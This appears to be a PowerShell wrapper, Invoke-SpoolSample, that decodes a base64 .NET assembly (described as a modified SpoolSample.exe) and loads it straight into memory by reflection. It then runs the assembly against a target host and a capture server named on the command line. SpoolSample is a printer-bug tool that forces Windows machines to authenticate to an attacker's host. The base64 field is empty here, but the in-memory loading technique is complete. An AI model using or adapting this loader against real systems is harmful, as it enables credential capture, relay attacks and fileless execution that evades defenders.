function Invoke-SpoolSample
{
    Param([string]$Target,[string]$CaptureServer)
    if(-not($Target) -Or -not($CaptureServer)) 
    { 
        Write-Host "Invalid number of args. Syntax: Invoke-SpoolSample -Target 'DESKTOP-CJR35OT' -CaptureServer 'DESKTOP-CJR35OT/pipe/test'"
	      Break Script
    }
    # Base64 modified SpoolSample.exe 
    $SpoolSampleB64 = ""
    $Stream=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String($SpoolSampleB64))
    $output = New-Object System.IO.MemoryStream
    $Stream.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    $Command = @($Target, $CaptureServer).split("")

    # Execute Binary 
    [SpoolSample.SpoolSample]::main($Command)

    # Print Result 
    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
